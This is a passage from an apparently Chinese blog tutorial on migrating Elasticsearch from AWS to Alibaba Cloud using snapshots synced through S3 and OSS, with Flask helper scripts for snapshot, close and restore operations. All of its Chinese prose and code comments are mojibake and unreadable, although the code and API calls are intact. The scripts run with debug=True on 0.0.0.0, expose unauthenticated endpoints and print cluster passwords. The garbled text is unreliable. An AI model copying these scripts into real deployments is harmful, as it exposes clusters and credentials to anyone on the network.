<li>è®¾ç½®æ¯ä¸ªèŠ‚ç‚¹ä¸ŠåŒæ—¶è¿›è¡Œçš„åˆ†ç‰‡æ¢å¤æ“ä½œæ•°é‡ä¸º 16</li>
<li>å½±å“é›†ç¾¤é‡æ–°å¹³è¡¡ã€èŠ‚ç‚¹é‡å¯åçš„æ•°æ®æ¢å¤é€Ÿåº¦</li>
</ul>
<p>cluster.routing.allocation.node_initial_primaries_recoveries:</p>
<ul>
<li>è®¾ç½®æ¯ä¸ªèŠ‚ç‚¹ä¸ŠåŒæ—¶è¿›è¡Œçš„ä¸»åˆ†ç‰‡åˆå§‹æ¢å¤æ“ä½œæ•°é‡ä¸º 16</li>
<li>ä¸»è¦å½±å“æ–°ç´¢å¼•åˆ›å»ºæˆ–é›†ç¾¤å¯åŠ¨æ—¶çš„ä¸»åˆ†ç‰‡åˆ†é…é€Ÿåº¦</li>
</ul>
<p>é…ç½®ç‰¹ç‚¹</p>
<ul>
<li>æŒä¹…åŒ–è®¾ç½®: ä½¿ç”¨ persistent é…ç½®ï¼Œé‡å¯åä»ç„¶æœ‰æ•ˆ</li>
<li>æ€§èƒ½ä¼˜åŒ–: å¢åŠ å¹¶å‘åº¦å¯ä»¥åŠ å¿«é›†ç¾¤æ¢å¤å’Œé‡æ–°å¹³è¡¡é€Ÿåº¦</li>
<li>èµ„æºç®¡ç†: éœ€è¦æ ¹æ®èŠ‚ç‚¹ç¡¬ä»¶èµ„æºåˆç†è®¾ç½®ï¼Œé¿å…è¿‡åº¦æ¶ˆè€—ç³»ç»Ÿèµ„æº</li>
</ul>
<p>é€‚ç”¨åœºæ™¯</p>
<ul>
<li>é›†ç¾¤æ‰©å®¹æˆ–ç¼©å®¹æ—¶åŠ é€Ÿåˆ†ç‰‡é‡æ–°åˆ†é…</li>
<li>èŠ‚ç‚¹ç»´æŠ¤åå¿«é€Ÿæ¢å¤æœåŠ¡</li>
<li>å¤§è§„æ¨¡æ•°æ®è¿ç§»æ—¶æé«˜æ•ˆç‡</li>
</ul>
<h2 data-id="heading-6">æ€»ç»“çš„è¿ç§»æ­¥éª¤</h2>
<h4 data-id="heading-7">ç¬¬ä¸€æ¬¡å¿«ç…§æ¢å¤åŠ¨ä½œ</h4>
<p>1ã€åœ¨AWSä¸Šçš„esåˆ›å»ºå¿«ç…§å¹¶ä¸Šä¼ åˆ°S3</p>
<pre><code class="hljs language-bash" lang="bash">GET _snapshot
<span class="hljs-comment"># åˆ›å»ºä»“åº“</span>
PUT _snapshot/ali_backup
{
  <span class="hljs-string">"type"</span>: <span class="hljs-string">"s3"</span>,
  <span class="hljs-string">"settings"</span>: {
    <span class="hljs-string">"bucket"</span>: <span class="hljs-string">"AWSäº‘S3æ¡¶åç§°"</span>,
    <span class="hljs-string">"base_path"</span>: <span class="hljs-string">"æ¡¶ä¸‹é¢çš„è·¯å¾„"</span>,
    <span class="hljs-string">"region"</span>: <span class="hljs-string">"cn-north-1"</span>,
    <span class="hljs-string">"endpoint"</span>: <span class="hljs-string">"s3.cn-north-1.amazonaws.com.cn"</span>
  }
}
<span class="hljs-comment"># ç¬¬ä¸€ä¸ªç‰ˆæœ¬å¿«ç…§</span>
PUT _snapshot/ali_backup/prd_01
{
  <span class="hljs-string">"indices"</span>: <span class="hljs-string">"*"</span>,
  <span class="hljs-string">"ignore_unavailable"</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-string">"include_global_state"</span>: <span class="hljs-literal">false</span>
}
<span class="hljs-comment"># æŸ¥çœ‹å¿«ç…§è¿›åº¦</span>
GET _cat/snapshots/ali_backup?v
</code></pre>
<p>2ã€å¯åŠ¨S3åˆ°ossçš„æ•°æ®åŒæ­¥ä»»åŠ¡ï¼šç»è¿‡ä¸Šé¢çš„æ­¥éª¤AWSçš„esæ•°æ®å·²ç»åŒæ­¥åˆ°S3ï¼Œé…ç½®æ•°æ®åŒæ­¥å°†S3æ•°æ®åŒæ­¥åˆ°é˜¿é‡Œäº‘OSSå¹¶è§‚å¯Ÿæ•°æ®åŒæ­¥ç»“æœ</p>
<p>3ã€åœ¨é˜¿é‡Œäº‘ESä¸Šæ¢å¤å¿«ç…§</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ›´æ–°ä»“åº“</span>
PUT _snapshot/ali_backup
{
<span class="hljs-string">"type"</span>: <span class="hljs-string">"oss"</span>,
<span class="hljs-string">"settings"</span>: {
            <span class="hljs-string">"base_path"</span>: <span class="hljs-string">"æ¡¶ä¸‹é¢çš„è·¯å¾„"</span>,
            <span class="hljs-string">"endpoint"</span>: <span class="hljs-string">"http://oss-cn-beijing-internal.aliyuncs.com"</span>, 
            <span class="hljs-string">"access_key_id"</span>: <span class="hljs-string">"*************"</span>,
            <span class="hljs-string">"secret_access_key"</span>: <span class="hljs-string">"*************"</span>,
            <span class="hljs-string">"bucket"</span>: <span class="hljs-string">"ossæ¡¶"</span>,
            <span class="hljs-string">"compress"</span>: <span class="hljs-literal">true</span>
      }
}

<span class="hljs-comment"># æŸ¥çœ‹å¿«ç…§</span>
GET _snapshot/ali_backup/prd_01

<span class="hljs-comment"># å…¨é‡æ¢å¤å¿«ç…§ï¼ˆæ’é™¤ç³»ç»Ÿç´¢å¼•ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç¬¬ä¸€æ¬¡æ¢å¤æ‰€ä»¥ä¸éœ€è¦å…³é—­ç´¢å¼•ï¼‰</span>
POST _snapshot/ali_backup/prd_01/_restore
{
    <span class="hljs-string">"indices"</span>: <span class="hljs-string">"*,-.*,-system*,-ilm*,-kibana*,-.kibana*"</span>
}
<span class="hljs-comment"># * æ¢å¤é•œåƒä¸­çš„æ‰€æœ‰ç´¢å¼•</span>
<span class="hljs-comment"># -.*  æ’é™¤ç³»ç»Ÿç´¢å¼•</span>
<span class="hljs-comment"># -system*  </span>
<span class="hljs-comment"># -ilm* æ’é™¤ILMç´¢å¼•</span>
<span class="hljs-comment"># -kibana*,-.kibana*  æ’é™¤kibanaç´¢å¼•</span>
</code></pre>
<h4 data-id="heading-8">ç¬¬äºŒæ¬¡å¿«ç…§æ¢å¤åŠ¨ä½œ</h4>
<p>1ã€åœ¨AWSä¸Šçš„esåˆ›å»ºå¿«ç…§å¹¶ä¸Šä¼ åˆ°S3ï¼Œç¬¬2ä¸ªç‰ˆæœ¬prd_02</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¬¬2ä¸ªç‰ˆæœ¬å¿«ç…§</span>
PUT _snapshot/ali_backup/prd_02
{
  <span class="hljs-string">"indices"</span>: <span class="hljs-string">"*"</span>,
  <span class="hljs-string">"ignore_unavailable"</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-string">"include_global_state"</span>: <span class="hljs-literal">false</span>
}
<span class="hljs-comment"># æŸ¥çœ‹å¿«ç…§è¿›åº¦</span>
GET _cat/snapshots/ali_backup?v
</code></pre>
<p>2ã€å¯åŠ¨S3åˆ°ossçš„æ•°æ®åŒæ­¥ä»»åŠ¡</p>
<p>3ã€åœ¨é˜¿é‡Œäº‘ESä¸Šæ¢å¤å¿«ç…§</p>
<pre><code class="hljs language-bash" lang="bash">
<span class="hljs-comment"># æŸ¥çœ‹å¿«ç…§</span>
GET _snapshot/ali_backup/prd_02

<span class="hljs-comment"># å…³é—­æ‰€æœ‰ç´¢å¼•ä¸»è¦è¦æ’é™¤ç³»ç»Ÿç´¢å¼•ï¼Œä¸ç„¶kibanaä¼šæŠ¥é”™å°±æ²¡æ³•æ“ä½œäº†</span>
POST /*,-.*,-system*,-ilm*,-kibana*,-.kibana*/_close

<span class="hljs-comment"># å…¨é‡æ¢å¤å¿«ç…§æ’é™¤ç³»ç»Ÿç´¢å¼•</span>
POST _snapshot/ali_backup/prd_02/_restore
{
    <span class="hljs-string">"indices"</span>: <span class="hljs-string">"*,-.*,-system*,-ilm*,-kibana*,-.kibana*"</span>
}
</code></pre>
<h4 data-id="heading-9">æ€»ç»“è¯´æ˜</h4>
<p>å¿«ç…§æ¢å¤æ¯”è¾ƒç®€å•é«˜æ•ˆï¼Œå½“æ®é‡å¤§çš„æƒ…å†µä¸‹ç¬¬ä¸€æ¬¡æ‰“å¿«ç…§å’Œæ¢å¤å¿«ç…§æ—¶é—´è¾ƒé•¿ï¼Œåé¢åšå¢é‡å¿«ç…§å’Œæ¢å¤å¢é‡å¿«ç…§æ¯”è¾ƒå¿«ã€‚</p>
<h2 data-id="heading-10">esç”Ÿæˆå¿«ç…§è„šæœ¬</h2>
<p>ä¸‹é¢æ˜¯åŸºäºpythonå¼€å‘çš„ç”Ÿæˆå¿«ç…§ã€å…³é—­ç´¢å¼•ã€æ¢å¤ç´¢å¼•ã€æ‰“å¼€ç´¢å¼•ã€æŸ¥çœ‹æ¢å¤çŠ¶æ€ã€æŸ¥çœ‹ç´¢å¼•ç‰ˆæœ¬çš„å·¥å…·ï¼Œæ–¹ä¾¿è¿›è¡Œå¤šæ¬¡æ‰“å¿«ç…§æ¢å¤å¿«ç…§é¿å…åœ¨kibanaä¸Šé¢‘ç¹æ“ä½œè¯¯æ“ä½œã€‚</p>
<p>es_ba_config.toml</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[AWS-es01]</span>
<span class="hljs-attr">es_host</span> = <span class="hljs-string">"xxxxx.ssss.net.cn"</span>
<span class="hljs-attr">es_port</span> = <span class="hljs-number">9200</span>
<span class="hljs-attr">protocol</span> = <span class="hljs-string">"https"</span>
<span class="hljs-attr">username</span> = <span class="hljs-string">"elastic"</span>  <span class="hljs-comment"># ç”¨æˆ·å</span>
<span class="hljs-attr">password</span> = <span class="hljs-string">"xxxxxxxxxxxxxx"</span>  <span class="hljs-comment"># å¯†ç </span>

<span class="hljs-section">[AWS-es02]</span>
<span class="hljs-attr">es_host</span> = <span class="hljs-string">"xxxxx.ssss.cn"</span>
<span class="hljs-attr">es_port</span> = <span class="hljs-number">9200</span>
<span class="hljs-attr">protocol</span> = <span class="hljs-string">"https"</span>
<span class="hljs-attr">username</span> = <span class="hljs-string">"elastic"</span>  <span class="hljs-comment"># ç”¨æˆ·å</span>
<span class="hljs-attr">password</span> = <span class="hljs-string">"XXXXXXXXP"</span>  <span class="hljs-comment"># å¯†ç </span>
</code></pre>
<p>es_re_config.toml</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[ALI-es-01]</span>
<span class="hljs-attr">es_host</span> = <span class="hljs-string">"XXXXXXXXXXXXXXXXXXXXXXXXxx.aliyuncs.com"</span>
<span class="hljs-attr">es_port</span> = <span class="hljs-number">9200</span>
<span class="hljs-attr">protocol</span> = <span class="hljs-string">"https"</span>
<span class="hljs-attr">username</span> = <span class="hljs-string">"elastic"</span>  <span class="hljs-comment"># ç”¨æˆ·å</span>
<span class="hljs-attr">password</span> = <span class="hljs-string">"XXXXXXXXX"</span>  <span class="hljs-comment"># å¯†ç </span>

<span class="hljs-section">[ALI-es-02]</span>
<span class="hljs-attr">es_host</span> = <span class="hljs-string">"XXXXXXXXXXXXXXXXXXXXXXXXxx.aliyuncs.com"</span>
<span class="hljs-attr">es_port</span> = <span class="hljs-number">9200</span>
<span class="hljs-attr">protocol</span> = <span class="hljs-string">"https"</span>
<span class="hljs-attr">username</span> = <span class="hljs-string">"elastic"</span>  <span class="hljs-comment"># ç”¨æˆ·å</span>
<span class="hljs-attr">password</span> = <span class="hljs-string">"XXXXXXXXX"</span>  <span class="hljs-comment"># å¯†ç </span>
</code></pre>
<p>es-backup.py</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> toml
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, jsonify, request
app = Flask(__name__)

<span class="hljs-comment">#----------------------------åŠ è½½é…ç½®æ–‡ä»¶---------------------------#</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_config</span>(<span class="hljs-params">config_name</span>):
    <span class="hljs-string">"""
    è·å–é…ç½®ä¿¡æ¯å¹¶è®¾ç½®å…¨å±€å˜é‡
    """</span>
    <span class="hljs-keyword">global</span> ES_HOST, ES_PORT, PROTOCOL, USERNAME, PASSWORD

    <span class="hljs-keyword">try</span>:
        file_path = <span class="hljs-string">r"D:\work\es_ba_config.toml"</span>
        config = toml.load(file_path)[config_name]

        <span class="hljs-comment"># è®¾ç½®å…¨å±€å˜é‡</span>
        ES_HOST = config.get(<span class="hljs-string">'es_host'</span>)
        ES_PORT = config.get(<span class="hljs-string">'es_port'</span>)
        PROTOCOL = config.get(<span class="hljs-string">'protocol'</span>)
        USERNAME = config.get(<span class="hljs-string">'username'</span>)
        PASSWORD = config.get(<span class="hljs-string">'password'</span>)

        <span class="hljs-built_in">print</span>({
            <span class="hljs-string">'ES_HOST'</span>: ES_HOST,
            <span class="hljs-string">'ES_PORT'</span>: ES_PORT,
            <span class="hljs-string">'PROTOCOL'</span>: PROTOCOL,
            <span class="hljs-string">'USERNAME'</span>: USERNAME,
            <span class="hljs-string">'PASSWORD'</span>: PASSWORD
        })
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŠ è½½é…ç½®å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
<span class="hljs-comment">#----------------------------åŠ è½½é…ç½®æ–‡ä»¶---------------------------#</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/get_snapshot_status'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">api_get_snapshot_status</span>():
    <span class="hljs-string">"""
    APIæ¥å£ï¼šè·å–å¿«ç…§çŠ¶æ€
    æ‰§è¡Œå‘½ä»¤: GET _cat/snapshots/plrs_target_ps_visit_precondition?v
    """</span>
    data = request.get_json()
    repository = data.get(<span class="hljs-string">'repository'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)
    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_cat/snapshots/<span class="hljs-subst">{repository}</span>?v"</span>

    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚å‚æ•°</span>
    params = {
        <span class="hljs-string">'v'</span>: <span class="hljs-string">'true'</span>  <span class="hljs-comment"># æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</span>
    }

    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ GET è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯å’Œå‚æ•°</span>
        response = requests.get(url, params=params, auth=auth)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>

        <span class="hljs-built_in">print</span>(response.text)

        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">"success"</span>,
            <span class="hljs-string">"data"</span>: response.text
        })

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"è·å–å¿«ç…§çŠ¶æ€å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>,
            <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
        })


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/create_snapshot'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">api_create_snapshot</span>():
    <span class="hljs-string">"""
    APIæ¥å£ï¼šåˆ›å»ºå¿«ç…§
    æ‰§è¡Œå‘½ä»¤: PUT _snapshot/plrs_target_ps_visit_precondition/prd_01
    """</span>
    <span class="hljs-comment"># ä½¿ç”¨é»˜è®¤å‚æ•°åŒ¹é…æŒ‡å®šçš„å¿«ç…§åˆ›å»ºå‘½ä»¤</span>
    ignore_unavailable = <span class="hljs-literal">True</span>
    include_global_state = <span class="hljs-literal">False</span>
    data = request.get_json()
    repository = data.get(<span class="hljs-string">'repository'</span>)
    snapshot = data.get(<span class="hljs-string">'snapshot'</span>)
    indices = data.get(<span class="hljs-string">'indices'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)

    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_snapshot/<span class="hljs-subst">{repository}</span>/<span class="hljs-subst">{snapshot}</span>"</span>

    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚ä½“</span>
    body = {
        <span class="hljs-string">"indices"</span>: indices,
        <span class="hljs-string">"ignore_unavailable"</span>: ignore_unavailable,
        <span class="hljs-string">"include_global_state"</span>: include_global_state
    }

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ PUT è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯å’Œè¯·æ±‚ä½“</span>
        response = requests.put(url, auth=auth, json=body)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>

        <span class="hljs-comment"># è¿”å› JSON å“åº”æ•°æ®</span>
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">"å¿«ç…§åˆ›å»ºæˆåŠŸ"</span>,
            <span class="hljs-string">"data"</span>: response.json()
        })

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">"åˆ›å»ºå¿«ç…§å¤±è´¥"</span>,
            <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
        })
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">True</span>)
</code></pre>
<p>es-restore.py</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> toml
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, jsonify, request
app = Flask(__name__)


<span class="hljs-comment">#----------------------------åŠ è½½é…ç½®æ–‡ä»¶---------------------------#</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_config</span>(<span class="hljs-params">config_name</span>):
    <span class="hljs-string">"""
    è·å–é…ç½®ä¿¡æ¯å¹¶è®¾ç½®å…¨å±€å˜é‡
    """</span>
    <span class="hljs-keyword">global</span> ES_HOST, ES_PORT, PROTOCOL, USERNAME, PASSWORD

    <span class="hljs-keyword">try</span>:
        file_path = <span class="hljs-string">r"D:\work\es_re_config.toml"</span>
        config = toml.load(file_path)[config_name]

        <span class="hljs-comment"># è®¾ç½®å…¨å±€å˜é‡</span>
        ES_HOST = config.get(<span class="hljs-string">'es_host'</span>)
        ES_PORT = config.get(<span class="hljs-string">'es_port'</span>)
        PROTOCOL = config.get(<span class="hljs-string">'protocol'</span>)
        USERNAME = config.get(<span class="hljs-string">'username'</span>)
        PASSWORD = config.get(<span class="hljs-string">'password'</span>)

        <span class="hljs-built_in">print</span>({
            <span class="hljs-string">'ES_HOST'</span>: ES_HOST,
            <span class="hljs-string">'ES_PORT'</span>: ES_PORT,
            <span class="hljs-string">'PROTOCOL'</span>: PROTOCOL,
            <span class="hljs-string">'USERNAME'</span>: USERNAME,
            <span class="hljs-string">'PASSWORD'</span>: PASSWORD
        })
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŠ è½½é…ç½®å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
<span class="hljs-comment">#----------------------------åŠ è½½é…ç½®æ–‡ä»¶---------------------------#</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_es_indices_status</span>(<span class="hljs-params">es_host, es_port=<span class="hljs-number">9200</span>, protocol=<span class="hljs-string">'http'</span>, username=<span class="hljs-literal">None</span>, password=<span class="hljs-literal">None</span></span>):
    <span class="hljs-string">"""
    è·å– Elasticsearch æ‰€æœ‰ç´¢å¼•çš„çŠ¶æ€ä¿¡æ¯

    Args:
        es_host (str): Elasticsearch ä¸»æœºåœ°å€
        es_port (int): Elasticsearch ç«¯å£å·ï¼Œé»˜è®¤ä¸º 9200
        protocol (str): åè®®ç±»å‹ï¼Œé»˜è®¤ä¸º 'http'
        username (str): ç”¨æˆ·åï¼Œç”¨äºåŸºæœ¬è®¤è¯
        password (str): å¯†ç ï¼Œç”¨äºåŸºæœ¬è®¤è¯

    Returns:
        dict: ç´¢å¼•çŠ¶æ€ä¿¡æ¯
    """</span>
    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{protocol}</span>://<span class="hljs-subst">{es_host}</span>:<span class="hljs-subst">{es_port}</span>/_cat/indices/*"</span>

    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚å‚æ•°</span>
    params = {
        <span class="hljs-string">'h'</span>: <span class="hljs-string">'index,status'</span>,  <span class="hljs-comment"># åªè¿”å›ç´¢å¼•åå’ŒçŠ¶æ€</span>
        <span class="hljs-string">'expand_wildcards'</span>: <span class="hljs-string">'all'</span>  <span class="hljs-comment"># å±•å¼€æ‰€æœ‰é€šé…ç¬¦åŒ¹é…çš„ç´¢å¼•</span>
    }

    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> username <span class="hljs-keyword">and</span> password:
        auth = (username, password)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ GET è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯</span>
        response = requests.get(url, params=params, auth=auth)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>

        <span class="hljs-comment"># å¤„ç†å“åº”æ•°æ®</span>
        indices_data = response.text.strip()
        <span class="hljs-keyword">if</span> indices_data:
            <span class="hljs-comment"># æŒ‰è¡Œåˆ†å‰²å¹¶å¤„ç†æ•°æ®</span>
            lines = indices_data.split(<span class="hljs-string">'\n'</span>)
            indices_status = {}
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
                <span class="hljs-keyword">if</span> line.strip():
                    parts = line.strip().split()
                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt;= <span class="hljs-number">2</span>:
                        index_name = parts[<span class="hljs-number">0</span>]
                        status = parts[<span class="hljs-number">1</span>]
                        indices_status[index_name] = status
            <span class="hljs-comment"># 2. è¿‡æ»¤å‡ºéç³»ç»Ÿç´¢å¼•</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næ­£åœ¨è¿‡æ»¤éç³»ç»Ÿç´¢å¼•..."</span>)
            non_system_indices = filter_non_system_indices(indices_status)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å…±æ‰¾åˆ° <span class="hljs-subst">{<span class="hljs-built_in">len</span>(non_system_indices)}</span> ä¸ªéç³»ç»Ÿç´¢å¼•:"</span>)
            <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> non_system_indices:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  - <span class="hljs-subst">{index}</span>"</span>)
            <span class="hljs-keyword">return</span> non_system_indices
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> {}

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¯·æ±‚ Elasticsearch å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_non_system_indices</span>(<span class="hljs-params">indices_status</span>):
    <span class="hljs-string">"""
    è¿‡æ»¤å‡ºæ‰€æœ‰éç³»ç»Ÿç´¢å¼•ï¼ˆä¸ä»¥ . å¼€å¤´çš„ç´¢å¼•ï¼‰

    Args:
        indices_status (dict): æ‰€æœ‰ç´¢å¼•åŠå…¶çŠ¶æ€

    Returns:
        list: éç³»ç»Ÿç´¢å¼•åˆ—è¡¨
    """</span>
    non_system_indices = []
    <span class="hljs-keyword">for</span> index_name <span class="hljs-keyword">in</span> indices_status.keys():
        <span class="hljs-comment"># è¿‡æ»¤æ‰ä»¥ . å¼€å¤´çš„ç³»ç»Ÿç´¢å¼•</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> index_name.startswith(<span class="hljs-string">'.'</span>):
            non_system_indices.append(index_name)

    <span class="hljs-keyword">return</span> non_system_indices

<span class="hljs-comment"># é€ä¸ªå…³é—­ç´¢å¼•</span>
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/close_individual_indices'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">close_individual_indices</span>():
    data = request.get_json()
    indices_list = data.get(<span class="hljs-string">'indices_list'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)
    <span class="hljs-string">"""
    é€ä¸ªå…³é—­ç´¢å¼•ï¼ˆæ›´å®‰å…¨çš„æ–¹å¼ï¼‰

    Args:
        es_host (str): Elasticsearch ä¸»æœºåœ°å€
        es_port (int): Elasticsearch ç«¯å£å·
        protocol (str): åè®®ç±»å‹
        username (str): ç”¨æˆ·å
        password (str): å¯†ç 
        indices_list (list): è¦å…³é—­çš„ç´¢å¼•åˆ—è¡¨,ä¾èµ–æ¥å£ä¼ é€’ï¼Œå¦‚æœæ˜¯ç©ºå°±è·å–å…¨éƒ¨

    Returns:
        dict: å…³é—­æ“ä½œç»“æœç»Ÿè®¡
    """</span>
    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    success_count = <span class="hljs-number">0</span>
    failed_count = <span class="hljs-number">0</span>
    details = []
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> indices_list:
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
            url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/*,-.*,-system*,-ilm*,-kibana*,-.kibana*/_close"</span>

            <span class="hljs-comment"># å‘é€ POST è¯·æ±‚å…³é—­å•ä¸ªç´¢å¼•</span>
            response = requests.post(url, auth=auth)
            response.raise_for_status()

        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å…³é—­ç´¢å¼• * å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
            details.append({<span class="hljs-string">"index"</span>: <span class="hljs-string">"*"</span>, <span class="hljs-string">"status"</span>: <span class="hljs-string">"failed"</span>, <span class="hljs-string">"error"</span>: <span class="hljs-built_in">str</span>(e)})
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">for</span> index_name <span class="hljs-keyword">in</span> indices_list:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
                url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/<span class="hljs-subst">{index_name}</span>/_close"</span>

                <span class="hljs-comment"># å‘é€ POST è¯·æ±‚å…³é—­å•ä¸ªç´¢å¼•</span>
                response = requests.post(url, auth=auth)
                response.raise_for_status()

                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æˆåŠŸå…³é—­ç´¢å¼•: <span class="hljs-subst">{index_name}</span>"</span>)
                success_count += <span class="hljs-number">1</span>
                details.append({<span class="hljs-string">"index"</span>: index_name, <span class="hljs-string">"status"</span>: <span class="hljs-string">"success"</span>})

            <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
